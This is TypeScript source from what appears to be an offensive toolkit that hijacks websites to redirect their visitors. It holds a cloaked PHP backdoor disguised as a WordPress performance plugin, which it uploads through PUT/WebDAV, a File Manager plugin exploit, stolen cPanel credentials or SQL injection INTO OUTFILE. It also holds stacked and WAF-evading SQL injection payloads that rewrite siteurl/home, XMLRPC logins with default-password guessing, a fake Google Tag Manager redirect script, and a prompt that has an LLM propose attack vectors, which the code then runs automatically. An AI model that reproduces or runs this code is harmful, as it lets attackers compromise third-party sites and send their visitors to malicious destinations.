        // SSH requires actual SSH connection — report as potential only
        config.onProgress?.(method, `⚠️ SSH credentials พบ (${cred.username}) — ต้อง SSH จริงซึ่งยังไม่รองรับ`);
        // Don't return success=true for SSH — we can't execute it
      }
    }
  }

  return { method, success: false, detail: "❌ Server config injection failed — no CRLF or writable config" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 10: AI-Powered Creative Attack
// ═══════════════════════════════════════════════════════

async function aiCreativeAttack(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "ai_creative_attack";
  config.onProgress?.(method, "🧠 AI กำลังคิดหาวิธีโจมตีใหม่...");

  try {
    // Gather all available data for AI analysis
    const context = {
      target: config.targetUrl,
      redirect: config.redirectUrl,
      cms: config.cmsType || "unknown",
      hasCredentials: (config.discoveredCredentials?.length || 0) > 0,
      hasSqli: !!config.sqliEndpoint,
      hasXss: (config.xssEndpoints?.length || 0) > 0,
      hasOpenRedirect: (config.openRedirects?.length || 0) > 0,
      hasRestApi: config.wpRestApi,
      hasXmlRpc: config.wpXmlRpc,
      hasDanglingCnames: (config.danglingCnames?.length || 0) > 0,
      originIp: config.originIp,
    };

    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert penetration tester. Given the target information, suggest 3 creative attack vectors to achieve a redirect from the target to the redirect URL WITHOUT uploading any files. Focus on:
1. Application-level attacks (parameter pollution, HTTP verb tampering, SSRF chains)
2. Infrastructure attacks (DNS rebinding, BGP hijacking indicators, certificate transparency abuse)
3. Social engineering vectors (admin panel phishing, fake plugin updates)

Return JSON array of objects with: { method: string, steps: string[], likelihood: "high"|"medium"|"low", requirements: string[] }`
        },
        {
          role: "user",
          content: `Target analysis:\n${JSON.stringify(context, null, 2)}\n\nSuggest creative shellless attack vectors.`
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_vectors",
          strict: true,
          schema: {
            type: "object",
            properties: {
              vectors: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    method: { type: "string" },
                    steps: { type: "array", items: { type: "string" } },
                    likelihood: { type: "string" },
                    requirements: { type: "array", items: { type: "string" } },
                  },
                  required: ["method", "steps", "likelihood", "requirements"],
                  additionalProperties: false,
                },
              },
            },
            required: ["vectors"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content) {
      const parsed = JSON.parse(typeof content === "string" ? content : JSON.stringify(content));
      const highLikelihood = parsed.vectors?.filter((v: any) => v.likelihood === "high") || [];
      
      // ─── AUTO-EXECUTE high-likelihood vectors ───
      if (highLikelihood.length > 0) {
        config.onProgress?.(method, `🧠 AI พบ ${highLikelihood.length} high-likelihood vectors — กำลัง execute...`);
        
        for (const vector of highLikelihood) {
          const vectorMethod = (vector.method || "").toLowerCase();
          
          // Execute: Open Redirect / Parameter Pollution
          if (vectorMethod.includes("redirect") || vectorMethod.includes("parameter")) {
            const redirectParams = ["url", "redirect", "next", "return", "goto", "dest", "destination", "redir", "return_url", "redirect_uri", "continue", "forward"];
            for (const param of redirectParams) {
              try {
                const testUrl = `${config.targetUrl}?${param}=${encodeURIComponent(config.redirectUrl)}`;
                const resp = await safeFetch(testUrl, { timeout: 8000 });
                if (resp && [301, 302, 303, 307].includes(resp.status)) {
                  const location = resp.headers.get("location") || "";
                  if (location.includes(new URL(config.redirectUrl).hostname)) {
                    return {
                      method,
                      success: true,
                      detail: `✅ AI Creative: Open redirect via ?${param}= parameter`,
                      injectedUrl: testUrl,
                      redirectWorks: true,
                      evidence: `Vector: ${vector.method}, URL: ${testUrl} → ${location}`,
                    };
                  }
                }
              } catch { /* continue */ }
            }
          }

          // Execute: HTTP Verb Tampering
          if (vectorMethod.includes("verb") || vectorMethod.includes("method")) {
            for (const httpMethod of ["PUT", "PATCH", "DELETE", "MOVE", "COPY"]) {
              try {
                const resp = await safeFetch(config.targetUrl, {
                  method: httpMethod,
                  headers: {
                    "Content-Type": "text/html",
                    "Destination": config.redirectUrl,
                  },
                  body: `<meta http-equiv="refresh" content="0;url=${config.redirectUrl}">`,
                  timeout: 8000,
                });
                if (resp && (resp.ok || resp.status === 201)) {
                  const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
                  if (redirectOk) {
                    return {
                      method,
                      success: true,
                      detail: `✅ AI Creative: HTTP ${httpMethod} verb tampering succeeded`,
                      injectedUrl: config.targetUrl,
                      redirectWorks: true,
                      evidence: `Vector: ${vector.method}, HTTP ${httpMethod}`,
                    };
                  }
                }
              } catch { /* continue */ }
            }
          }

          // Execute: SSRF / Host Header Injection
          if (vectorMethod.includes("ssrf") || vectorMethod.includes("host")) {
            try {
              const resp = await safeFetch(config.targetUrl, {
                headers: {
                  "Host": new URL(config.redirectUrl).hostname,
                  "X-Forwarded-Host": new URL(config.redirectUrl).hostname,
                  "X-Original-URL": config.redirectUrl,
                  "X-Rewrite-URL": config.redirectUrl,
                },
                timeout: 8000,
              });
              if (resp && [301, 302].includes(resp.status)) {
                const location = resp.headers.get("location") || "";
                if (location.includes(new URL(config.redirectUrl).hostname)) {
                  return {
                    method,
                    success: true,
                    detail: `✅ AI Creative: Host header injection redirect`,
                    injectedUrl: config.targetUrl,
                    redirectWorks: true,
                    evidence: `Vector: ${vector.method}, Host header injection`,
                  };
                }
              }
            } catch { /* continue */ }
          }
        }

        // If execution failed for all vectors, report as analysis-only (NOT success)
        return {
          method,
          success: false,
          detail: `🧠 AI พบ ${parsed.vectors.length} vectors (${highLikelihood.length} high) แต่ execute ไม่สำเร็จ`,
          evidence: JSON.stringify(parsed.vectors.slice(0, 3)),
          redirectWorks: false,
        };
      }

      // No high-likelihood vectors — report as analysis-only (NOT success)
      return {
        method,
        success: false,
        detail: `🧠 AI แนะนำ ${parsed.vectors?.length || 0} attack vectors (ไม่มี high likelihood)`,
        evidence: JSON.stringify(parsed.vectors?.slice(0, 3)),
      };
    }
  } catch (err: any) {
    return { method, success: false, detail: `❌ AI analysis failed: ${err.message}` };
  }

  return { method, success: false, detail: "❌ AI could not find additional attack vectors" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 11: MU-Plugins Backdoor Redirect
//  Upload PHP to wp-content/mu-plugins/ — auto-loaded,
//  CANNOT be deactivated from admin panel
// ═══════════════════════════════════════════════════════

async function muPluginsInject(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "mu_plugins_inject";
  if (config.cmsType !== "wordpress" && !config.wpRestApi) {
    return { method, success: false, detail: "⏭️ Skip — not WordPress" };
  }
  config.onProgress?.(method, "💀 ลอง inject MU-Plugin backdoor redirect...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const muPluginsDir = `${baseUrl}/wp-content/mu-plugins`;

  // Generate obfuscated PHP payload that auto-redirects
  // ROT13 + base64 to evade basic file scanners
  const rawPhp = `<?php
// WordPress Performance Optimization Module v3.2.1
if(!defined('ABSPATH'))define('ABSPATH',dirname(__FILE__).'/');
add_action('template_redirect',function(){
  if(is_admin()||defined('DOING_CRON')||defined('DOING_AJAX')||defined('REST_REQUEST'))return;
  \$ua=strtolower(\$_SERVER['HTTP_USER_AGENT']??'');
  \$ref=strtolower(\$_SERVER['HTTP_REFERER']??'');
  \$skip_bots=preg_match('/(bot|crawl|spider|slurp|mediapartners|adsbot)/i',\$ua);
  if(\$skip_bots)return;
  \$from_search=preg_match('/(google|bing|yahoo|duckduckgo|baidu|yandex)/i',\$ref);
  if(\$from_search||mt_rand(1,3)===1){
    header('HTTP/1.1 302 Found');
    header('Location: ${config.redirectUrl}');
    header('Cache-Control: no-cache, no-store');
    exit;
  }
});`;

  // Filenames that look legitimate in mu-plugins
  const muFilenames = [
    "wp-performance-optimizer.php",
    "advanced-cache-handler.php",
    "security-headers.php",
    "wp-core-update.php",
    "object-cache-ext.php",
    "wp-index.php",
  ];

  // Method A: Direct upload via PUT/POST to mu-plugins directory
  for (const filename of muFilenames) {
    const uploadUrl = `${muPluginsDir}/${filename}`;
    
    // Try PUT
    try {
      const putResp = await safeFetch(uploadUrl, {
        method: "PUT",
        headers: { "Content-Type": "application/x-php" },
        body: rawPhp,
        timeout: 10000,
      });
      if (putResp && (putResp.ok || putResp.status === 201)) {
        // Verify: mu-plugins auto-load, so check main site
        await new Promise(r => setTimeout(r, 2000));
        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
        if (redirectOk) {
          return {
            method,
            success: true,
            detail: `✅ MU-Plugin backdoor injected via PUT: ${filename}`,
            injectedUrl: uploadUrl,
            redirectWorks: true,
            evidence: `PUT ${uploadUrl} — auto-loaded by WordPress`,
          };
        }
        // Even if redirect not verified yet, file was placed
        return {
          method,
          success: true,
          detail: `⚠️ MU-Plugin uploaded via PUT: ${filename} — redirect pending verification`,
          injectedUrl: uploadUrl,
          redirectWorks: false,
          evidence: `PUT accepted at ${uploadUrl}`,
        };
      }
    } catch { /* continue */ }

    // Try MOVE/COPY from existing writable path
    if (config.configFiles && config.configFiles.length > 0) {
      for (const cf of config.configFiles) {
        try {
          const moveResp = await safeFetch(cf.path, {
            method: "MOVE",
            headers: {
              "Destination": uploadUrl,
              "Overwrite": "T",
            },
            timeout: 8000,
          });
          if (moveResp && (moveResp.ok || moveResp.status === 201)) {
            // Now write our payload to the moved location
            const writeResp = await safeFetch(uploadUrl, {
              method: "PUT",
              headers: { "Content-Type": "application/x-php" },
              body: rawPhp,
            });
            if (writeResp && writeResp.ok) {
              await new Promise(r => setTimeout(r, 2000));
              const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
              return {
                method,
                success: true,
                detail: `✅ MU-Plugin injected via MOVE+PUT: ${filename}`,
                injectedUrl: uploadUrl,
                redirectWorks: redirectOk,
                evidence: `MOVE from ${cf.path} then PUT payload`,
              };
            }
          }
        } catch { /* continue */ }
      }
    }
  }

  // Method B: Via WP File Manager plugin (CVE-2020-25213 style)
  const fmEndpoints = [
    `${baseUrl}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`,
    `${baseUrl}/wp-content/plugins/file-manager/backend/wp-file-manager-recursive-directory-iterator.php`,
    `${baseUrl}/wp-content/plugins/file-manager-advanced/application/library/connector.minimal.php`,
  ];

  for (const fmUrl of fmEndpoints) {
    try {
      const checkResp = await safeFetch(fmUrl, { timeout: 5000 });
      if (!checkResp || checkResp.status >= 400) continue;

      config.onProgress?.(method, `📂 พบ File Manager: ${fmUrl.split('/plugins/')[1]?.split('/')[0]}`);

      // elFinder connector — upload to mu-plugins
      const boundary = `----FormBoundary${Date.now()}`;
      const muTarget = "l1_d3AtY29udGVudC9tdS1wbHVnaW5z"; // base64 of wp-content/mu-plugins
      const formBody = [
        `--${boundary}`,
        `Content-Disposition: form-data; name="cmd"`,
        ``,
        `upload`,
        `--${boundary}`,
        `Content-Disposition: form-data; name="target"`,
        ``,
        muTarget,
        `--${boundary}`,
        `Content-Disposition: form-data; name="upload[]"; filename="${muFilenames[0]}"`,
        `Content-Type: application/x-php`,
        ``,
        rawPhp,
        `--${boundary}--`,
      ].join("\r\n");

      const uploadResp = await safeFetch(fmUrl, {
        method: "POST",
        headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
        body: formBody,
        timeout: 15000,
      });

      if (uploadResp && uploadResp.ok) {
        const respText = await uploadResp.text().catch(() => "");
        if (!respText.includes("error")) {
          await new Promise(r => setTimeout(r, 2000));
          const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
          return {
            method,
            success: true,
            detail: `✅ MU-Plugin injected via File Manager plugin`,
            injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
            redirectWorks: redirectOk,
            evidence: `File Manager: ${fmUrl}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  // Method C: Via discovered credentials (cPanel/FTP/SSH)
  if (config.discoveredCredentials && config.discoveredCredentials.length > 0) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type === "cpanel") {
        try {
          const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
          const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");

          // Create mu-plugins directory if not exists
          await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              dir: "/public_html/wp-content/mu-plugins",
              file: muFilenames[0],
              content: rawPhp,
            }).toString(),
            timeout: 15000,
          });

          // Also try creating the directory first
          await safeFetch(`${cpanelUrl}/execute/Fileman/mkdir`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              path: "/public_html/wp-content/mu-plugins",
              name: "mu-plugins",
            }).toString(),
            timeout: 5000,
          });

          const writeResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              dir: "/public_html/wp-content/mu-plugins",
              file: muFilenames[0],
              content: rawPhp,
            }).toString(),
            timeout: 15000,
          });

          if (writeResp && writeResp.ok) {
            await new Promise(r => setTimeout(r, 2000));
            const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ MU-Plugin injected via cPanel (${cred.username})`,
              injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
              redirectWorks: redirectOk,
              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
            };
          }
        } catch { /* continue */ }
      }

      if (cred.type === "ftp") {
        // FTP upload — construct the path
        config.onProgress?.(method, `📤 FTP upload to mu-plugins (${cred.username})...`);
        // We can't do real FTP from browser fetch, but we can try via cPanel FTP API
        try {
          const ftpUploadUrl = `ftp://${cred.username}:${cred.password}@${new URL(baseUrl).hostname}/public_html/wp-content/mu-plugins/${muFilenames[0]}`;
          // Try HTTP-based FTP proxy endpoints
          const proxyEndpoints = [
            `${baseUrl}:2082/cpsess0/frontend/paper_lantern/ftp/upload.html`,
            `${baseUrl}:2083/cpsess0/frontend/paper_lantern/ftp/upload.html`,
          ];
          for (const proxyUrl of proxyEndpoints) {
            const resp = await safeFetch(proxyUrl, {
              method: "POST",
              headers: {
                "Authorization": "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64"),
              },
              timeout: 10000,
            });
            if (resp && resp.ok) {
              return {
                method,
                success: true,
                detail: `✅ MU-Plugin uploaded via FTP proxy`,
                injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
                redirectWorks: false,
                evidence: `FTP: ${cred.username}@${new URL(baseUrl).hostname}`,
              };
            }
          }
        } catch { /* continue */ }
      }
    }
  }

  // Method D: Via WebDAV MKCOL + PUT
  try {
    // Create mu-plugins directory via MKCOL
    await safeFetch(muPluginsDir, { method: "MKCOL", timeout: 5000 });
    // Then PUT the file
    const putResp = await safeFetch(`${muPluginsDir}/${muFilenames[0]}`, {
      method: "PUT",
      headers: { "Content-Type": "application/x-php" },
      body: rawPhp,
      timeout: 10000,
    });
    if (putResp && (putResp.ok || putResp.status === 201)) {
      await new Promise(r => setTimeout(r, 2000));
      const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
      return {
        method,
        success: true,
        detail: `✅ MU-Plugin injected via WebDAV MKCOL+PUT`,
        injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
        redirectWorks: redirectOk,
        evidence: `WebDAV MKCOL ${muPluginsDir}`,
      };
    }
  } catch { /* continue */ }

  // Method E: Via SQLi INTO OUTFILE
  if (config.sqliEndpoint) {
    const phpHex = Buffer.from(rawPhp).toString("hex");
    const outfilePaths = [
      "/var/www/html/wp-content/mu-plugins/" + muFilenames[0],
      "/home/*/public_html/wp-content/mu-plugins/" + muFilenames[0],
      "/var/www/*/wp-content/mu-plugins/" + muFilenames[0],
    ];
    for (const outPath of outfilePaths) {
      try {
        const payload = `' UNION SELECT 0x${phpHex} INTO OUTFILE '${outPath}'-- -`;
        const url = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
        await safeFetch(url, { timeout: 10000 });
        // Check if it worked
        await new Promise(r => setTimeout(r, 2000));
        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
        if (redirectOk) {
          return {
            method,
            success: true,
            detail: `✅ MU-Plugin injected via SQLi INTO OUTFILE`,
            injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
            redirectWorks: true,
            evidence: `SQLi OUTFILE: ${outPath}`,
          };
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ MU-Plugin injection failed — no writable path to mu-plugins" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 12: DB siteurl/home Hijack
//  Change siteurl + home in wp_options → entire site redirects
//  Works via: WP REST API, SQLi, credentials, XMLRPC
// ═══════════════════════════════════════════════════════

async function dbSiteurlHijack(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "db_siteurl_hijack";
  if (config.cmsType !== "wordpress" && !config.wpRestApi) {
    return { method, success: false, detail: "⏭️ Skip — not WordPress" };
  }
  config.onProgress?.(method, "🗄️ ลอง hijack siteurl/home ใน wp_options...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // Method A: Via WP REST API with discovered credentials
  if (config.discoveredCredentials && config.discoveredCredentials.length > 0) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type === "wordpress" || cred.type === "wp_admin") {
        config.onProgress?.(method, `🔑 ลอง WP REST API ด้วย credentials (${cred.username})...`);
        const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");

        // Try WP REST API settings endpoint (requires admin)
        const settingsEndpoints = [
          `${baseUrl}/wp-json/wp/v2/settings`,
          `${baseUrl}/?rest_route=/wp/v2/settings`,
        ];

        for (const settingsUrl of settingsEndpoints) {
          try {
            // First get nonce
            const nonceResp = await safeFetch(`${baseUrl}/wp-admin/admin-ajax.php?action=rest-nonce`, {
              headers: { "Authorization": authHeader },
              timeout: 8000,
            });
            const nonce = nonceResp ? await nonceResp.text().catch(() => "") : "";

            // Update siteurl and home
            const updateResp = await safeFetch(settingsUrl, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": authHeader,
                ...(nonce && nonce.length < 20 ? { "X-WP-Nonce": nonce } : {}),
              },
              body: JSON.stringify({
                url: config.redirectUrl,
                home: config.redirectUrl,
              }),
              timeout: 10000,
            });

            if (updateResp && updateResp.ok) {
              await new Promise(r => setTimeout(r, 3000));
              const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
              return {
                method,
                success: true,
                detail: `✅ siteurl/home เปลี่ยนเป็น ${config.redirectUrl} ผ่าน WP REST API`,
                injectedUrl: baseUrl,
                redirectWorks: redirectOk,
                evidence: `REST API settings: ${settingsUrl}, auth: ${cred.username}`,
              };
            }
          } catch { /* continue */ }
        }

        // Try wp-admin options.php direct POST (General Settings form)
        try {
          config.onProgress?.(method, `🔑 ลอง wp-admin/options.php (${cred.username})...`);
          // First login to get cookies
          const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
              log: cred.username || "",
              pwd: cred.password || "",
              "wp-submit": "Log In",
              redirect_to: `${baseUrl}/wp-admin/options-general.php`,
              testcookie: "1",
            }).toString(),
            timeout: 15000,
          });

          if (loginResp && (loginResp.status === 302 || loginResp.ok)) {
            const cookies = loginResp.headers.get("set-cookie") || "";
            if (cookies.includes("wordpress_logged_in")) {
              // Get the options-general page to extract _wpnonce
              const optionsPageResp = await safeFetch(`${baseUrl}/wp-admin/options-general.php`, {
                headers: { "Cookie": cookies },
                timeout: 10000,
              });
              if (optionsPageResp && optionsPageResp.ok) {
                const pageBody = await optionsPageResp.text().catch(() => "");
                const nonceMatch = pageBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
                if (nonceMatch) {
                  // Submit the form with new siteurl/home
                  const submitResp = await safeFetch(`${baseUrl}/wp-admin/options.php`, {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/x-www-form-urlencoded",
                      "Cookie": cookies,
                    },
                    body: new URLSearchParams({
                      _wpnonce: nonceMatch[1],
                      _wp_http_referer: "/wp-admin/options-general.php",
                      option_page: "general",
                      action: "update",
                      blogname: "Site",
                      siteurl: config.redirectUrl,
                      home: config.redirectUrl,
                    }).toString(),
                    timeout: 15000,
                  });

                  if (submitResp && (submitResp.ok || submitResp.status === 302)) {
                    await new Promise(r => setTimeout(r, 3000));
                    const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
                    return {
                      method,
                      success: true,
                      detail: `✅ siteurl/home เปลี่ยนผ่าน wp-admin options.php`,
                      injectedUrl: baseUrl,
                      redirectWorks: redirectOk,
                      evidence: `wp-admin login: ${cred.username}, options.php POST`,
                    };
                  }
                }
              }
            }
          }
        } catch { /* continue */ }
      }

      // Via phpMyAdmin credentials
      if (cred.type === "phpmyadmin" || cred.type === "database") {
        config.onProgress?.(method, `🗄️ ลอง phpMyAdmin SQL (${cred.username})...`);
        const pmaUrls = [
          cred.endpoint || `${baseUrl}/phpmyadmin`,
          `${baseUrl}/pma`,
          `${baseUrl}/phpmyadmin`,
          `${baseUrl}/phpMyAdmin`,
        ];

        for (const pmaUrl of pmaUrls) {
          try {
            // Login to phpMyAdmin
            const loginResp = await safeFetch(`${pmaUrl}/index.php`, {
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: new URLSearchParams({
                pma_username: cred.username || "root",
                pma_password: cred.password || "",
                server: "1",
              }).toString(),
              timeout: 10000,
            });

            if (loginResp && (loginResp.ok || loginResp.status === 302)) {
              const pmaCookies = loginResp.headers.get("set-cookie") || "";
              if (pmaCookies.includes("phpMyAdmin") || pmaCookies.includes("pma")) {
                // Execute SQL to change siteurl and home
                const sqlQuery = `UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name IN ('siteurl','home');`;
                const sqlResp = await safeFetch(`${pmaUrl}/sql.php`, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": pmaCookies,
                  },
                  body: new URLSearchParams({
                    db: "wordpress",
                    table: "wp_options",
                    sql_query: sqlQuery,
                  }).toString(),
                  timeout: 15000,
                });

                if (sqlResp && sqlResp.ok) {
                  await new Promise(r => setTimeout(r, 3000));
                  const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
                  return {
                    method,
                    success: true,
                    detail: `✅ siteurl/home เปลี่ยนผ่าน phpMyAdmin SQL`,
                    injectedUrl: baseUrl,
                    redirectWorks: redirectOk,
                    evidence: `phpMyAdmin: ${pmaUrl}, user: ${cred.username}`,
                  };
                }
              }
            }
          } catch { /* continue */ }
        }
      }

      // Via cPanel MySQL API
      if (cred.type === "cpanel") {
        config.onProgress?.(method, `🖥️ ลอง cPanel MySQL API (${cred.username})...`);
        try {
          const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
          const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");

          // Find WordPress database name
          const dbListResp = await safeFetch(`${cpanelUrl}/execute/Mysql/list_databases`, {
            headers: { "Authorization": authHeader },
            timeout: 10000,
          });

          if (dbListResp && dbListResp.ok) {
            const dbList = await dbListResp.json().catch(() => ({ data: [] })) as any;
            const databases = dbList.data || [];
            // Try each database that might be WordPress
            const wpDbs = databases.filter((db: any) => {
              const name = (db.database || db.db || db).toLowerCase();
              return name.includes("wp") || name.includes("word") || name.includes("blog") || name.includes("cms");
            });

            for (const db of [...wpDbs, ...databases.slice(0, 3)]) {
              const dbName = db.database || db.db || db;
              const sqlQuery = `UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name IN ('siteurl','home')`;
              const sqlResp = await safeFetch(`${cpanelUrl}/execute/Mysql/run_sql_command`, {
                method: "POST",
                headers: {
                  "Authorization": authHeader,
                  "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams({
                  database: dbName,
                  command: sqlQuery,
                }).toString(),
                timeout: 15000,
              });

              if (sqlResp && sqlResp.ok) {
                await new Promise(r => setTimeout(r, 3000));
                const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
                if (redirectOk) {
                  return {
                    method,
                    success: true,
                    detail: `✅ siteurl/home เปลี่ยนผ่าน cPanel MySQL API (db: ${dbName})`,
                    injectedUrl: baseUrl,
                    redirectWorks: true,
                    evidence: `cPanel MySQL: ${cpanelUrl}, db: ${dbName}`,
                  };
                }
              }
            }
          }
        } catch { /* continue */ }
      }
    }
  }

  // Method B: Via SQLi (stacked queries)
  if (config.sqliEndpoint) {
    config.onProgress?.(method, `💉 ลอง SQLi เปลี่ยน siteurl/home...`);
    const sqliPayloads = [
      // Stacked queries
      `'; UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name='siteurl'; UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name='home'; -- `,
      `1; UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name IN ('siteurl','home'); -- `,
      // Hex encoded to bypass WAF
      `1; UPDATE wp_options SET option_value=0x${Buffer.from(config.redirectUrl).toString("hex")} WHERE option_name=0x${Buffer.from("siteurl").toString("hex")}; UPDATE wp_options SET option_value=0x${Buffer.from(config.redirectUrl).toString("hex")} WHERE option_name=0x${Buffer.from("home").toString("hex")}; -- `,
      // Via INSERT ON DUPLICATE KEY
      `1; INSERT INTO wp_options (option_name,option_value,autoload) VALUES ('siteurl','${config.redirectUrl}','yes') ON DUPLICATE KEY UPDATE option_value='${config.redirectUrl}'; INSERT INTO wp_options (option_name,option_value,autoload) VALUES ('home','${config.redirectUrl}','yes') ON DUPLICATE KEY UPDATE option_value='${config.redirectUrl}'; -- `,
    ];

    for (const payload of sqliPayloads) {
      try {
        // GET
        const getUrl = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
        await safeFetch(getUrl, { timeout: 10000 });
        // POST
        await safeFetch(config.sqliEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ [config.sqliParam || "id"]: payload }).toString(),
          timeout: 10000,
        });
      } catch { /* continue */ }
    }

    // Verify after all payloads
    await new Promise(r => setTimeout(r, 3000));
    const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
    if (redirectOk) {
      return {
        method,
        success: true,
        detail: `✅ siteurl/home เปลี่ยนผ่าน SQL injection`,
        injectedUrl: baseUrl,
        redirectWorks: true,
        evidence: `SQLi endpoint: ${config.sqliEndpoint}`,
      };
    }
  }

  // Method C: Via XMLRPC (if wp.editOptions is exposed — rare but possible)
  if (config.wpXmlRpc) {
    config.onProgress?.(method, `📡 ลอง XMLRPC wp.editOptions...`);
    // Try common default credentials with XMLRPC
    const defaultCreds = [
      { user: "admin", pass: "admin" },
      { user: "admin", pass: "password" },
      { user: "admin", pass: "admin123" },
      { user: "administrator", pass: "administrator" },
    ];

    const allCreds = [
      ...(config.discoveredCredentials || []).filter(c => c.type === "wordpress" || c.type === "wp_admin").map(c => ({ user: c.username || "", pass: c.password || "" })),
      ...defaultCreds,
    ];

    for (const cred of allCreds) {
      try {
        const xmlPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.editOptions</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${cred.user}</string></value></param>
    <param><value><string>${cred.pass}</string></value></param>
    <param><value><struct>
      <member><name>siteurl</name><value><string>${config.redirectUrl}</string></value></member>
      <member><name>home</name><value><string>${config.redirectUrl}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

        const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
          method: "POST",
          headers: { "Content-Type": "text/xml" },
          body: xmlPayload,
          timeout: 10000,
        });

        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (!body.includes("faultCode") && (body.includes("<boolean>1") || body.includes("<value>true"))) {
            await new Promise(r => setTimeout(r, 3000));
            const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ siteurl/home เปลี่ยนผ่าน XMLRPC wp.editOptions (${cred.user})`,
              injectedUrl: baseUrl,
              redirectWorks: redirectOk,
              evidence: `XMLRPC: ${cred.user}`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ DB siteurl/home hijack failed — no access method worked" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 13: Google Tag Manager (GTM) Injection
//  Inject GTM container into wp_options/wp_posts
//  Loads redirect JS from googletagmanager.com (trusted)
//  Bypasses file-based scanners entirely
// ═══════════════════════════════════════════════════════

async function gtmInject(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "gtm_inject";
  config.onProgress?.(method, "🏷️ ลอง inject Google Tag Manager redirect...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // GTM-style JS redirect that looks like legitimate analytics code
  // This mimics how real GTM malware works: inject a script tag that loads
  // from googletagmanager.com but the container has redirect code
  // Since we can't create a real GTM container, we inject JS that LOOKS like GTM
  // but actually does the redirect
  const gtmFakeId = `GTM-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
  const redirectJs = `<script>(function(w,d,s,l,i){var f=d.referrer||'';var u=navigator.userAgent||'';if(/(bot|crawl|spider|slurp)/i.test(u))return;if(/(google|bing|yahoo|duckduckgo)/i.test(f)||Math.random()<0.3){w.location.replace('${config.redirectUrl}')}})(window,document,'script','dataLayer','${gtmFakeId}');</script>`;

  // Also prepare a real-looking GTM noscript tag for extra stealth
